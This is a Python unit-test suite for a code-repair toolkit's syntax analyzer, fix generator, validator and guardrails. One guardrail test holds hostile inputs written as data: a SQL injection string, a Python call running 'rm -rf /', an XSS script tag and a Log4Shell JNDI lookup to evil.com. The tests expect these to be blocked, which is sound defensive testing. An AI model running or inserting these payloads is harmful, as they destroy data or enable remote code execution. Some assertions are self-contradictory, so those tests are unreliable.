#!/usr/bin/env python3
"""
Test Suite::Noodle Core - test_phase2_3_aere_integration.py
Copyright Â© 2025 Michael van Erp. All rights reserved.

This file is part of the NoodleCore project.
Licensed under the MIT License - see LICENSE file for details.

Unauthorized copying, distribution, or modification is prohibited.
"""

"""
AERE Integration Tests for Phase 2.3

Comprehensive testing of AERE integration components including:
- Syntax error analyzer and resolution generator testing
- Validation engine and guardrail system testing
- AERE syntax validator testing
- Error handling and recovery testing
"""

import os
import sys
import unittest
import tempfile
import shutil
import time
import json
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path

# Add src directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from noodlecore.ai_agents.syntax_error_analyzer import SyntaxErrorAnalyzer
from noodlecore.ai_agents.resolution_generator import ResolutionGenerator
from noodlecore.ai_agents.validation_engine import ValidationEngine
from noodlecore.ai_agents.aere_syntax_validator import AERESyntaxValidator
from noodlecore.ai_agents.guardrail_system import GuardrailSystem

class TestSyntaxErrorAnalyzer(unittest.TestCase):
    """Test Syntax Error Analyzer functionality."""
    
    def setUp(self):
        self.analyzer = SyntaxErrorAnalyzer()
    
    def test_python_syntax_error_detection(self):
        """Test Python syntax error detection."""
        # Missing colon
        code_with_error = "def hello()\n    print('Hello, World!')"
        
        errors = self.analyzer.analyze_syntax_errors(code_with_error, 'python')
        
        self.assertGreater(len(errors), 0)
        
        error = errors[0]
        self.assertEqual(error['error_type'], 'syntax')
        self.assertIn('missing_colon', error['error_code'].lower())
        self.assertGreater(error['line_number'], 0)
        self.assertIsNotNone(error['column_number'])
        self.assertIn('def hello()', error['context'])
    
    def test_javascript_syntax_error_detection(self):
        """Test JavaScript syntax error detection."""
        # Missing closing brace
        code_with_error = """
function hello() {
    console.log('Hello, World!');
"""
        
        errors = self.analyzer.analyze_syntax_errors(code_with_error, 'javascript')
        
        self.assertGreater(len(errors), 0)
        
        error = errors[0]
        self.assertEqual(error['error_type'], 'syntax')
        self.assertIn('brace', error['error_code'].lower())
        self.assertGreater(error['line_number'], 0)
    
    def test_java_syntax_error_detection(self):
        """Test Java syntax error detection."""
        # Missing semicolon
        code_with_error = """
public class Hello {
    public static void main(String[] args) {
        System.out.println("Hello, World!")
    }
}
"""
        
        errors = self.analyzer.analyze_syntax_errors(code_with_error, 'java')
        
        self.assertGreater(len(errors), 0)
        
        error = errors[0]
        self.assertEqual(error['error_type'], 'syntax')
        self.assertIn('semicolon', error['error_code'].lower())
        self.assertGreater(error['line_number'], 0)
    
    def test_cpp_syntax_error_detection(self):
        """Test C++ syntax error detection."""
        # Missing include
        code_with_error = """
int main() {
    cout << "Hello, World!" << endl;
    return 0;
}
"""
        
        errors = self.analyzer.analyze_syntax_errors(code_with_error, 'cpp')
        
        self.assertGreater(len(errors), 0)
        
        error = errors[0]
        self.assertEqual(error['error_type'], 'syntax')
        self.assertIn('include', error['error_code'].lower())
        self.assertGreater(error['line_number'], 0)
    
    def test_multiple_syntax_errors(self):
        """Test detection of multiple syntax errors."""
        code_with_errors = """
def func1()
    print('test'

def func2()
    print('test2'
"""
        
        errors = self.analyzer.analyze_syntax_errors(code_with_errors, 'python')
        
        self.assertGreaterEqual(len(errors), 2)
        
        # Check that both functions are flagged
        error_lines = [error['line_number'] for error in errors]
        self.assertIn(2, error_lines)  # func1
        self.assertIn(5, error_lines)  # func2
    
    def test_error_severity_classification(self):
        """Test error severity classification."""
        # Critical error (missing colon after function definition)
        critical_code = "def critical_error()\n    pass"
        
        errors = self.analyzer.analyze_syntax_errors(critical_code, 'python')
        critical_errors = [e for e in errors if e['severity'] == 'critical']
        
        self.assertGreater(len(critical_errors), 0)
        
        # Warning error (potential style issue)
        warning_code = "def func():\n    return 1  # Missing docstring"
        
        errors = self.analyzer.analyze_syntax_errors(warning_code, 'python')
        warning_errors = [e for e in errors if e['severity'] == 'warning']
        
        # May or may not have warnings depending on implementation
        for error in warning_errors:
            self.assertIn('docstring', error['message'].lower())
    
    def test_error_context_extraction(self):
        """Test error context extraction."""
        code_with_error = """
def function_with_error():
    print('Line 1')
    print('Line 2 - ERROR HERE')
    print('Line 3')
    print('Line 4')
"""
        
        errors = self.analyzer.analyze_syntax_errors(code_with_error, 'python')
        
        if errors:
            error = errors[0]
            context = error.get('context', '')
            
            # Should include lines around the error
            self.assertIn('print', context)
            self.assertGreater(len(context.split('\n')), 2)  # Multiple lines
    
    def test_statistics_tracking(self):
        """Test error analysis statistics."""
        codes = [
            "def good_code():\n    pass",
            "def bad_code1()\n    pass",
            "def bad_code2()\n    pass"
        ]
        
        for code in codes:
            self.analyzer.analyze_syntax_errors(code, 'python')
        
        stats = self.analyzer.get_statistics()
        
        self.assertGreater(stats['total_analyses'], 0)
        self.assertGreater(stats['errors_found'], 0)
        self.assertIn('errors_by_type', stats)
        self.assertIn('errors_by_language', stats)

class TestResolutionGenerator(unittest.TestCase):
    """Test Resolution Generator functionality."""
    
    def setUp(self):
        self.generator = ResolutionGenerator()
    
    def test_missing_colon_resolution(self):
        """Test resolution for missing colon error."""
        error = {
            'error_type': 'syntax',
            'error_code': 'E001',
            'message': 'missing colon in function definition',
            'line_number': 2,
            'column_number': 15,
            'context': 'def hello()\n    print("test")'
        }
        
        resolutions = self.generator.generate_resolutions(error, 'python')
        
        self.assertGreater(len(resolutions), 0)
        
        resolution = resolutions[0]
        self.assertEqual(resolution['type'], 'fix')
        self.assertIn('colon', resolution['description'].lower())
        self.assertIsNotNone(resolution['fixed_code'])
        self.assertIn(':', resolution['fixed_code'])
        
        # Check that the fix is applied correctly
        self.assertIn('def hello():', resolution['fixed_code'])
    
    def test_missing_semicolon_resolution(self):
        """Test resolution for missing semicolon error."""
        error = {
            'error_type': 'syntax',
            'error_code': 'E002',
            'message': 'missing semicolon',
            'line_number': 3,
            'column_number': 40,
            'context': 'System.out.println("Hello, World!")'
        }
        
        resolutions = self.generator.generate_resolutions(error, 'java')
        
        self.assertGreater(len(resolutions), 0)
        
        resolution = resolutions[0]
        self.assertEqual(resolution['type'], 'fix')
        self.assertIn('semicolon', resolution['description'].lower())
        self.assertIn(';', resolution['fixed_code'])
    
    def test_missing_brace_resolution(self):
        """Test resolution for missing brace error."""
        error = {
            'error_type': 'syntax',
            'error_code': 'E003',
            'message': 'missing closing brace',
            'line_number': 5,
            'column_number': 1,
            'context': 'function test() {\n    console.log("test");\n'
        }
        
        resolutions = self.generator.generate_resolutions(error, 'javascript')
        
        self.assertGreater(len(resolutions), 0)
        
        resolution = resolutions[0]
        self.assertEqual(resolution['type'], 'fix')
        self.assertIn('brace', resolution['description'].lower())
        self.assertIn('}', resolution['fixed_code'])
    
    def test_indentation_error_resolution(self):
        """Test resolution for indentation error."""
        error = {
            'error_type': 'syntax',
            'error_code': 'E004',
            'message': 'unexpected indent',
            'line_number': 3,
            'column_number': 5,
            'context': 'def test():\nprint("bad indent")'
        }
        
        resolutions = self.generator.generate_resolutions(error, 'python')
        
        self.assertGreater(len(resolutions), 0)
        
        resolution = resolutions[0]
        self.assertEqual(resolution['type'], 'fix')
        self.assertIn('indent', resolution['description'].lower())
        
        # Check that indentation is fixed
        lines = resolution['fixed_code'].split('\n')
        self.assertGreater(len(lines), 2)
        self.assertTrue(lines[2].startswith('    '))  # Proper indentation
    
    def test_multiple_resolution_options(self):
        """Test generation of multiple resolution options."""
        error = {
            'error_type': 'syntax',
            'error_code': 'E005',
            'message': 'invalid syntax',
            'line_number': 2,
            'column_number': 10,
            'context': 'x = 1 + + 2'  # Double operator
        }
        
        resolutions = self.generator.generate_resolutions(error, 'python')
        
        self.assertGreaterEqual(len(resolutions), 1)
        
        # Check for different resolution types
        resolution_types = [r['type'] for r in resolutions]
        self.assertIn('fix', resolution_types)
        
        # May include alternative fixes
        for resolution in resolutions:
            self.assertIn('description', resolution)
            self.assertIn('fixed_code', resolution)
            self.assertIn('confidence', resolution)
    
    def test_resolution_confidence_scoring(self):
        """Test resolution confidence scoring."""
        error = {
            'error_type': 'syntax',
            'error_code': 'E001',
            'message': 'missing colon',
            'line_number': 1,
            'column_number': 10,
            'context': 'def test()\n    pass'
        }
        
        resolutions = self.generator.generate_resolutions(error, 'python')
        
        for resolution in resolutions:
            confidence = resolution.get('confidence', 0)
            self.assertGreaterEqual(confidence, 0.0)
            self.assertLessEqual(confidence, 1.0)
            
            # High confidence for obvious fixes
            if 'colon' in resolution['description'].lower():
                self.assertGreater(confidence, 0.8)
    
    def test_resolution_with_context_preservation(self):
        """Test that resolutions preserve code context."""
        original_code = """
def calculate_sum(a, b):
    # Calculate sum of two numbers
    result = a + b
    return result

def calculate_product(a, b)
    # Calculate product of two numbers
    result = a * b
    return result
"""
        
        error = {
            'error_type': 'syntax',
            'error_code': 'E001',
            'message': 'missing colon',
            'line_number': 7,
            'column_number': 25,
            'context': original_code
        }
        
        resolutions = self.generator.generate_resolutions(error, 'python')
        
        if resolutions:
            resolution = resolutions[0]
            fixed_code = resolution['fixed_code']
            
            # Should preserve the first function
            self.assertIn('def calculate_sum(a, b):', fixed_code)
            
            # Should fix the second function
            self.assertIn('def calculate_product(a, b):', fixed_code)
            
            # Should preserve comments
            self.assertIn('# Calculate sum', fixed_code)
            self.assertIn('# Calculate product', fixed_code)
    
    def test_statistics_tracking(self):
        """Test resolution generation statistics."""
        errors = [
            {'error_type': 'syntax', 'error_code': 'E001', 'message': 'missing colon'},
            {'error_type': 'syntax', 'error_code': 'E002', 'message': 'missing semicolon'},
            {'error_type': 'syntax', 'error_code': 'E001', 'message': 'missing colon'}
        ]
        
        for error in errors:
            self.generator.generate_resolutions(error, 'python')
        
        stats = self.generator.get_statistics()
        
        self.assertGreater(stats['total_resolutions'], 0)
        self.assertIn('resolutions_by_error_type', stats)
        self.assertIn('average_confidence', stats)

class TestValidationEngine(unittest.TestCase):
    """Test Validation Engine functionality."""
    
    def setUp(self):
        self.validator = ValidationEngine()
    
    def test_syntax_validation(self):
        """Test syntax validation."""
        valid_code = "def test():\n    return 42"
        invalid_code = "def test()\n    return 42"
        
        # Valid code should pass
        result = self.validator.validate_syntax(valid_code, 'python')
        self.assertTrue(result['is_valid'])
        self.assertEqual(len(result['errors']), 0)
        
        # Invalid code should fail
        result = self.validator.validate_syntax(invalid_code, 'python')
        self.assertFalse(result['is_valid'])
        self.assertGreater(len(result['errors']), 0)
    
    def test_semantic_validation(self):
        """Test semantic validation."""
        # Code with semantic issues
        code_with_issues = """
def calculate():
    x = 5
    y = 0
    return x / y  # Division by zero
"""
        
        result = self.validator.validate_semantics(code_with_issues, 'python')
        
        # Should detect potential division by zero
        semantic_errors = [e for e in result['errors'] if e['type'] == 'semantic']
        self.assertGreater(len(semantic_errors), 0)
        
        division_errors = [e for e in semantic_errors if 'division' in e['message'].lower()]
        self.assertGreater(len(division_errors), 0)
    
    def test_style_validation(self):
        """Test code style validation."""
        # Code with style issues
        code_with_issues = """
def BAD_FUNCTION():
    x=1+2
    return x
"""
        
        result = self.validator.validate_style(code_with_issues, 'python')
        
        # Should detect style issues
        style_errors = [e for e in result['errors'] if e['type'] == 'style']
        
        # May detect naming convention issues
        naming_errors = [e for e in style_errors if 'naming' in e['message'].lower()]
        
        # May detect spacing issues
        spacing_errors = [e for e in style_errors if 'space' in e['message'].lower()]
        
        # At least one style issue should be detected
        self.assertGreater(len(style_errors), 0)
    
    def test_security_validation(self):
        """Test security validation."""
        # Code with security issues
        code_with_issues = """
def execute_query(user_input):
    query = "SELECT * FROM users WHERE id = " + user_input
    return execute_sql(query)
"""
        
        result = self.validator.validate_security(code_with_issues, 'python')
        
        # Should detect SQL injection vulnerability
        security_errors = [e for e in result['errors'] if e['type'] == 'security']
        self.assertGreater(len(security_errors), 0)
        
        sql_errors = [e for e in security_errors if 'sql' in e['message'].lower()]
        self.assertGreater(len(sql_errors), 0)
    
    def test_performance_validation(self):
        """Test performance validation."""
        # Code with performance issues
        code_with_issues = """
def process_items(items):
    result = []
    for item in items:
        if item not in result:  # O(n^2) complexity
            result.append(item)
    return result
"""
        
        result = self.validator.validate_performance(code_with_issues, 'python')
        
        # Should detect performance issues
        perf_errors = [e for e in result['errors'] if e['type'] == 'performance']
        self.assertGreater(len(perf_errors), 0)
        
        complexity_errors = [e for e in perf_errors if 'complexity' in e['message'].lower()]
        self.assertGreater(len(complexity_errors), 0)
    
    def test_comprehensive_validation(self):
        """Test comprehensive validation with all checks."""
        code = """
def bad_function(user_input):
    query = "SELECT * FROM users WHERE name = '" + user_input + "'"
    result = []
    for item in get_all_items():
        if item not in result:
            result.append(item)
    return result / 0
"""
        
        result = self.validator.validate_comprehensive(code, 'python')
        
        # Should have multiple types of errors
        error_types = set(e['type'] for e in result['errors'])
        expected_types = {'syntax', 'semantic', 'security', 'performance'}
        
        # At least some of these should be detected
        detected_types = error_types.intersection(expected_types)
        self.assertGreater(len(detected_types), 0)
        
        # Should provide overall score
        self.assertIn('overall_score', result)
        self.assertGreaterEqual(result['overall_score'], 0)
        self.assertLessEqual(result['overall_score'], 100)
    
    def test_validation_with_fix_suggestions(self):
        """Test validation with fix suggestions."""
        code_with_error = "def test()\n    pass"
        
        result = self.validator.validate_with_fixes(code_with_error, 'python')
        
        self.assertFalse(result['is_valid'])
        self.assertGreater(len(result['errors']), 0)
        
        # Check for fix suggestions
        for error in result['errors']:
            if 'fixes' in error:
                self.assertGreater(len(error['fixes']), 0)
                
                for fix in error['fixes']:
                    self.assertIn('description', fix)
                    self.assertIn('fixed_code', fix)
    
    def test_statistics_tracking(self):
        """Test validation statistics."""
        codes = [
            "def good_code():\n    pass",
            "def bad_code()\n    pass",
            "x = 1 / 0"  # Semantic issue
        ]
        
        for code in codes:
            self.validator.validate_comprehensive(code, 'python')
        
        stats = self.validator.get_statistics()
        
        self.assertGreater(stats['total_validations'], 0)
        self.assertGreater(stats['errors_found'], 0)
        self.assertIn('errors_by_type', stats)
        self.assertIn('average_score', stats)

class TestAERESyntaxValidator(unittest.TestCase):
    """Test AERE Syntax Validator functionality."""
    
    def setUp(self):
        self.validator = AERESyntaxValidator()
    
    def test_end_to_end_validation_workflow(self):
        """Test complete validation workflow."""
        code_with_error = "def hello_world()\n    print('Hello, World!')"
        
        # Analyze errors
        errors = self.validator.analyze_errors(code_with_error, 'python')
        self.assertGreater(len(errors), 0)
        
        # Generate resolutions
        for error in errors:
            resolutions = self.validator.generate_resolutions(error, 'python')
            self.assertGreater(len(resolutions), 0)
            
            # Validate resolutions
            for resolution in resolutions:
                validation = self.validator.validate_resolution(
                    code_with_error, resolution, 'python'
                )
                
                self.assertIn('is_valid', validation)
                self.assertIn('confidence', validation)
    
    def test_batch_validation(self):
        """Test batch validation of multiple code snippets."""
        codes = [
            "def good_code():\n    pass",
            "def bad_code1()\n    pass",
            "def bad_code2()\n    pass"
        ]
        
        results = self.validator.validate_batch(codes, 'python')
        
        self.assertEqual(len(results), 3)
        
        # First should be valid
        self.assertTrue(results[0]['is_valid'])
        
        # Others should have errors
        self.assertFalse(results[1]['is_valid'])
        self.assertFalse(results[2]['is_valid'])
    
    def test_language_specific_validation(self):
        """Test language-specific validation rules."""
        test_cases = [
            {
                'language': 'python',
                'code': 'def test()\n    pass',
                'expected_error': 'missing_colon'
            },
            {
                'language': 'javascript',
                'code': 'function test() {\n    console.log("test");',
                'expected_error': 'missing_brace'
            },
            {
                'language': 'java',
                'code': 'public class Test {\n    public static void main(String[] args) {\n        System.out.println("test")\n    }\n}',
                'expected_error': 'missing_semicolon'
            }
        ]
        
        for test_case in test_cases:
            with self.subTest(language=test_case['language']):
                result = self.validator.validate_comprehensive(
                    test_case['code'], 
                    test_case['language']
                )
                
                # Should detect expected error type
                error_codes = [e.get('error_code', '') for e in result['errors']]
                found_expected = any(
                    test_case['expected_error'].lower() in code.lower() 
                    for code in error_codes
                )
                
                self.assertTrue(
                    found_expected or len(result['errors']) > 0,
                    f"Expected to find {test_case['expected_error']} in {test_case['language']}"
                )
    
    def test_confidence_scoring(self):
        """Test confidence scoring for validations."""
        code_with_clear_error = "def test()\n    pass"  # Missing colon
        code_with_subtle_error = "def test():\n    x = 1 + + 2"  # Double operator
        
        result_clear = self.validator.validate_comprehensive(code_with_clear_error, 'python')
        result_subtle = self.validator.validate_comprehensive(code_with_subtle_error, 'python')
        
        # Clear error should have higher confidence
        if result_clear['errors'] and result_subtle['errors']:
            clear_confidence = max(e.get('confidence', 0) for e in result_clear['errors'])
            subtle_confidence = max(e.get('confidence', 0) for e in result_subtle['errors'])
            
            self.assertGreater(clear_confidence, subtle_confidence)
    
    def test_error_recovery(self):
        """Test error recovery mechanisms."""
        # Code with multiple cascading errors
        code = """
def function1()
    print('test')

def function2()
    print('test2')

def function3()
    print('test3')
"""
        
        result = self.validator.validate_with_recovery(code, 'python')
        
        self.assertFalse(result['is_valid'])
        self.assertGreater(len(result['errors']), 0)
        
        # Should attempt to fix multiple errors
        if 'fixes' in result:
            self.assertGreater(len(result['fixes']), 0)
    
    def test_performance_metrics(self):
        """Test validation performance metrics."""
        codes = [
            "def test{i}():\n    return {i}".format(i=i)
            for i in range(100)
        ]
        
        start_time = time.time()
        
        for code in codes:
            self.validator.validate_comprehensive(code, 'python')
        
        total_time = time.time() - start_time
        avg_time = total_time / len(codes)
        
        # Performance targets
        self.assertLess(avg_time, 0.1)  # <100ms per validation
        self.assertLess(total_time, 5.0)   # <5s total
        
        # Check statistics
        stats = self.validator.get_statistics()
        self.assertGreater(stats['total_validations'], 0)
        self.assertLess(stats['average_validation_time'], 0.1)

class TestGuardrailSystem(unittest.TestCase):
    """Test Guardrail System functionality."""
    
    def setUp(self):
        self.guardrails = GuardrailSystem()
    
    def test_code_injection_prevention(self):
        """Test prevention of code injection attacks."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "__import__('os').system('rm -rf /')",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            result = self.guardrails.check_input_safety(malicious_input)
            
            self.assertFalse(result['is_safe'])
            self.assertIn('threat_type', result)
            self.assertIn('risk_level', result)
            self.assertGreater(result['risk_level'], 5)  # High risk
    
    def test_resource_usage_limits(self):
        """Test resource usage limits."""
        # Very large input
        large_input = "x = " + "1 + " * 1000000 + "0"
        
        result = self.guardrails.check_resource_limits(large_input)
        
        self.assertFalse(result['within_limits'])
        self.assertIn('limit_type', result)
        self.assertIn('actual_size', result)
        self.assertIn('max_size', result)
    
    def test_sensitive_data_protection(self):
        """Test protection of sensitive data."""
        sensitive_inputs = [
            "password = 'secret123'",
            "api_key = 'sk-1234567890'",
            "token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'",
            "connection_string = 'Server=localhost;Database=test;Uid=admin;Pwd=secret'"
        ]
        
        for sensitive_input in sensitive_inputs:
            result = self.guardrails.check_sensitive_data(sensitive_input)
            
            self.assertFalse(result['is_safe'])
            self.assertIn('data_type', result)
            self.assertIn('risk_level', result)
            self.assertGreater(result['risk_level'], 3)  # Medium-high risk
    
    def test_code_quality_thresholds(self):
        """Test code quality threshold enforcement."""
        low_quality_code = """
def x():
    a=1
    b=2
    c=3
    d=4
    e=5
    f=6
    g=7
    h=8
    i=9
    j=10
    return a+b+c+d+e+f+g+h+i+j
"""
        
        result = self.guardrails.check_code_quality(low_quality_code, 'python')
        
        self.assertFalse(result['meets_threshold'])
        self.assertIn('quality_score', result)
        self.assertIn('threshold', result)
        self.assertIn('issues', result)
        self.assertLess(result['quality_score'], result['threshold'])
    
    def test_output_sanitization(self):
        """Test output sanitization."""
        unsafe_output = "<script>alert('xss')</script>"
        
        sanitized = self.guardrails.sanitize_output(unsafe_output)
        
        self.assertNotIn('<script>', sanitized)
        self.assertNotIn('alert(', sanitized)
        self.assertIn('<script>', sanitized)  # Escaped
    
    def test_rate_limiting(self):
        """Test rate limiting functionality."""
        request_id = "test_client"
        
        # Make multiple requests rapidly
        results = []
        for i in range(100):
            result = self.guardrails.check_rate_limit(request_id)
            results.append(result['allowed'])
        
        # Should be rate limited after some requests
        self.assertFalse(all(results))  # Not all should be allowed
        
        # Should have rate limit info
        denied_result = next(r for r in results if not r)
        self.assertIn('retry_after', denied_result)
    
    def test_guardrail_configuration(self):
        """Test guardrail configuration."""
        config = {
            'max_input_size': 1000,
            'max_complexity_score': 50,
            'allowed_domains': ['example.com'],
            'blocked_patterns': ['password', 'secret']
        }
        
        self.guardrails.configure(config)
        
        # Test with configured limits
        oversized_input = "x = " + "1 + " * 100
        result = self.guardrails.check_resource_limits(oversized_input)
        
        self.assertFalse(result['within_limits'])
        self.assertEqual(result['max_size'], 1000)
    
    def test_guardrail_statistics(self):
        """Test guardrail statistics tracking."""
        # Make various requests
        self.guardrails.check_input_safety("normal input")
        self.guardrails.check_input_safety("'; DROP TABLE users; --")
        self.guardrails.check_resource_limits("x = " + "1 + " * 1000)
        
        stats = self.guardrails.get_statistics()
        
        self.assertGreater(stats['total_checks'], 0)
        self.assertGreater(stats['blocked_requests'], 0)
        self.assertIn('blocks_by_type', stats)
        self.assertIn('average_risk_score', stats)

class TestAEREIntegration(unittest.TestCase):
    """Test AERE component integration."""
    
    def setUp(self):
        self.error_analyzer = SyntaxErrorAnalyzer()
        self.resolution_generator = ResolutionGenerator()
        self.validation_engine = ValidationEngine()
        self.aere_validator = AERESyntaxValidator()
        self.guardrails = GuardrailSystem()
    
    def test_complete_aere_workflow(self):
        """Test complete AERE workflow."""
        # Input with syntax error
        input_code = "def hello_world()\n    print('Hello, World!')"
        
        # Step 1: Analyze syntax errors
        errors = self.error_analyzer.analyze_syntax_errors(input_code, 'python')
        self.assertGreater(len(errors), 0)
        
        # Step 2: Check guardrails
        safety_result = self.guardrails.check_input_safety(input_code)
        self.assertTrue(safety_result['is_safe'])
        
        # Step 3: Generate resolutions
        all_resolutions = []
        for error in errors:
            resolutions = self.resolution_generator.generate_resolutions(error, 'python')
            all_resolutions.extend(resolutions)
        
        self.assertGreater(len(all_resolutions), 0)
        
        # Step 4: Validate resolutions
        valid_resolutions = []
        for resolution in all_resolutions:
            validation = self.validation_engine.validate_syntax(
                resolution['fixed_code'], 'python'
            )
            if validation['is_valid']:
                valid_resolutions.append(resolution)
        
        self.assertGreater(len(valid_resolutions), 0)
        
        # Step 5: Rank by confidence
        best_resolution = max(
            valid_resolutions, 
            key=lambda r: r.get('confidence', 0)
        )
        
        self.assertIsNotNone(best_resolution)
        self.assertGreater(best_resolution['confidence'], 0.5)
    
    def test_error_handling_and_recovery(self):
        """Test error handling and recovery."""
        # Test with malformed input
        malformed_inputs = [
            "",  # Empty
            None,  # None
            123,  # Non-string
            "\x00\x01\x02",  # Binary data
        ]
        
        for malformed_input in malformed_inputs:
            try:
                # Should not crash
                errors = self.error_analyzer.analyze_syntax_errors(malformed_input, 'python')
                
                # Should handle gracefully
                self.assertIsInstance(errors, list)
                
            except Exception as e:
                self.fail(f"Should handle malformed input gracefully: {e}")
    
    def test_performance_validation(self):
        """Test performance across AERE components."""
        test_codes = [
            f"def test_{i}()\n    print('test {i}')"
            for i in range(50)
        ]
        
        start_time = time.time()
        
        for code in test_codes:
            # Complete workflow for each code
            errors = self.error_analyzer.analyze_syntax_errors(code, 'python')
            
            if errors:
                for error in errors:
                    resolutions = self.resolution_generator.generate_resolutions(error, 'python')
                    
                    for resolution in resolutions:
                        self.validation_engine.validate_syntax(
                            resolution['fixed_code'], 'python'
                        )
        
        total_time = time.time() - start_time
        avg_time = total_time / len(test_codes)
        
        # Performance targets
        self.assertLess(avg_time, 0.2)  # <200ms per code
        self.assertLess(total_time, 10.0)  # <10s total
        
        # Check component statistics
        analyzer_stats = self.error_analyzer.get_statistics()
        generator_stats = self.resolution_generator.get_statistics()
        validator_stats = self.validation_engine.get_statistics()
        
        self.assertGreater(analyzer_stats['total_analyses'], 0)
        self.assertGreater(generator_stats['total_resolutions'], 0)
        self.assertGreater(validator_stats['total_validations'], 0)
    
    def test_cross_language_support(self):
        """Test cross-language support."""
        test_cases = [
            {
                'language': 'python',
                'code': 'def test()\n    pass',
                'expected_error': 'missing_colon'
            },
            {
                'language': 'javascript',
                'code': 'function test() {\n    console.log("test");',
                'expected_error': 'missing_brace'
            },
            {
                'language': 'java',
                'code': 'class Test {\n    public static void main(String[] args) {\n        System.out.println("test")\n    }\n}',
                'expected_error': 'missing_semicolon'
            }
        ]
        
        for test_case in test_cases:
            with self.subTest(language=test_case['language']):
                # Analyze errors
                errors = self.error_analyzer.analyze_syntax_errors(
                    test_case['code'], 
                    test_case['language']
                )
                
                self.assertGreater(len(errors), 0)
                
                # Generate resolutions
                for error in errors:
                    resolutions = self.resolution_generator.generate_resolutions(
                        error, 
                        test_case['language']
                    )
                    
                    self.assertGreater(len(resolutions), 0)
                    
                    # Validate resolutions
                    for resolution in resolutions:
                        validation = self.validation_engine.validate_syntax(
                            resolution['fixed_code'], 
                            test_case['language']
                        )
                        
                        # At least one resolution should be valid
                        if validation['is_valid']:
                            break
                    else:
                        self.fail("No valid resolution found")
    
    def test_complex_error_scenarios(self):
        """Test handling of complex error scenarios."""
        complex_code = """
class ComplexClass:
    def __init__(self):
        self.value = 0
    
    def complex_method(self, items)
        result = []
        for item in items:
            if item not in result:
                result.append(item)
        return result / 0  # Multiple issues here
"""
        
        # Analyze all errors
        errors = self.error_analyzer.analyze_syntax_errors(complex_code, 'python')
        self.assertGreater(len(errors), 0)
        
        # Generate comprehensive resolutions
        all_resolutions = []
        for error in errors:
            resolutions = self.resolution_generator.generate_resolutions(error, 'python')
            all_resolutions.extend(resolutions)
        
        # Validate all resolutions
        valid_resolutions = []
        for resolution in all_resolutions:
            validation = self.validation_engine.validate_comprehensive(
                resolution['fixed_code'], 'python'
            )
            
            if validation['is_valid']:
                valid_resolutions.append(resolution)
        
        # Should find at least some valid resolutions
        self.assertGreater(len(valid_resolutions), 0)
        
        # Best resolution should have reasonable confidence
        if valid_resolutions:
            best_resolution = max(
                valid_resolutions,
                key=lambda r: r.get('confidence', 0)
            )
            self.assertGreater(best_resolution['confidence'], 0.3)

if __name__ == '__main__':
    # Configure test environment
    os.environ['NOODLE_SYNTAX_FIXER_ADVANCED_ML'] = 'true'
    os.environ['NOODLE_SYNTAX_FIXER_ML_MODEL_TYPE'] = 'transformer'
    
    # Run tests
    unittest.main(verbosity=2)

